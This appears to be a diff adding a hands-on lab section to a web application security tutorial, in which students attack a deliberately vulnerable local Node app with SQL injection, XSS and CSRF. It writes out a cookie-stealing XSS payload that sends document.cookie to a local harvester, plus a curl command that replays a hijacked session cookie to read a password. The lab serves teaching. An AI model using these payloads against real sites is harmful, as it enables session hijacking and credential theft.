@@ -8,6 +8,8 @@ data, and data users would like not to be destroyed. Any exploited security flaw
 can quickly damage the reputation of an application, if not the business
 behind it.
 
+*Obligatory notice*: some of the things you'll be trying in this lab are potentially dangerous. Accessing or attacking a computer system without authorization is illegal, and [people go to prison for it](http://en.wikipedia.org/wiki/List_of_computer_criminals).
+
 ## Basic tenets of web application security
 
 The most fundamental rule of web application security is *don't trust user inputs*.
@@ -191,3 +193,82 @@ Fortunately, there are many systems that allow you to leverage third parties to 
 * [Facebook connect](https://developers.facebook.com/docs/guides/web/)
 * [Twitter connect](https://dev.twitter.com/docs/auth/sign-twitter)
 * [OAuth](http://en.wikipedia.org/wiki/OAuth) (Designed for a slightly different use case, but used for authentication sometimes nonetheless.)
+
+## Your tasks
+
+Download the lab from [TODOTODOTODOTODO]() and unzip it.
+
+You'll get a chance to practice SQL injection, XSS, and CSRF with a toy Node application
+which is riddled with holes and bad practices.
+
+The endpoints for the application are:
+
+* `/` Shows recent posts
+* `/user/:username` Shows information about a user
+* `/login?username=user&password=somepassword` Log in to the application (it is just the endpoint, there is no proper login form.)
+* `/write-post?username=user&body=sometext` Write a new post
+* `/my-password` Show the password for the current user
+
+You can try some of these endpoints and see various access denied/error messages.
+
+Your goals are going to be as follows:
+* Steal the password for the `jbieber` account via SQL injection
+* Use those credentials to inject a payload into a post on the homepage.
+* Pretend to be `sbraun` and load the homepage.
+* Use the hijacked cookie to steal sbraun's password.
+
+*Note*: there are easier ways to get both passwords than these steps. Don't do it! It's against the rules, and this way will be more fun anyways.
+
+### Practicing SQL injection
+
+First, you'll have to steal the password to an account in order to post to it. Use [a query with `UNION`](http://en.wikipedia.org/wiki/Set_operations_(SQL)#UNION_operator) to figure out the password in the information for the `jbieber` account shown at `/user/jbieber`. The constructed SQL is also printed in the server logs if you're having trouble.
+
+### Practicing XSS
+
+Use that password and username to login to the application as `jbeiber`:
+
+`http://localhost:8080/login?username=jbieber&password=somepasswordyoufound`
+
+You've now got a cookie set in your browser which will authenticate `/write-post`. Your post is going to have a special payload, of course.
+
+Your payload will be the following snippet:
+
+`%3Cimg%20src%3D%22a%22%20onerror%3D%22this.src%3D'http%3A%2F%2Flocalhost%3A3011%2Fharvest?cookie='%2Bdocument.cookie%22%20%2F%3E`
+
+i.e. `<img src="a" onerror="this.src='http://localhost:3011/harvest?cookie='+document.cookie" />`
+
+This is an image with a bad source. On error it uses a little bit of Javascript to re-set its source to a URL of another small Node application which you should start (in another terminal tab) at this point:
+
+`node harvester.js`
+
+It listens on port 3011 for requests to `/harvest` and logs everything sent to the console. Try it out:
+
+`http://localhost:3011/harvest?x=y&a=b`
+
+The image above sets the `cookie` parameter to the value of `document.cookie`, which contains all the cookies for the current page.
+
+#### Being Scooter Braun
+
+Here you're going to have to suspend your disbelief momentarily as you become the victim.
+
+Hit the following URL to login as `sbraun`:
+
+`http://localhost:8080/become-sbraun`
+
+Now you're authenticated as `sbraun` and can post as him, etc. Critically, when you follow the link to see the latest posts you're going to run your own XSS payload and send `sbraun`'s authentication cookie to the harvester you're running in another tab!
+
+Now, donning your attacker hat again, you can use his authentication cookie to steal `sbraun`'s password with the `/my-password` endpoint. You can use `curl`, a command line utility to make HTTP requests, to do this. It might look something like this (with your own stolen cookie):
+
+`curl -b "user=s:sbraun.2pnRJRduah87bTyZt5KPLOADSHD8wsq1N0h8pCs30" http://localhost:8080/my-password`
+
+And presto, you have his password too!
+
+### Practicing CSRF
+
+Following the example payload above, write a post which causes the victim to write a post when they load the homepage. You'll probably want to write it in plain text, but when you're done URL-encode it [with this tool](http://meyerweb.com/eric/tools/dencoder/). (This allows you to have things like slashes and spaces in your URL.)
+
+## Checkoff
+
+Please prepare:
+* The passwords you collected for the two accounts
+* The payload you constructed
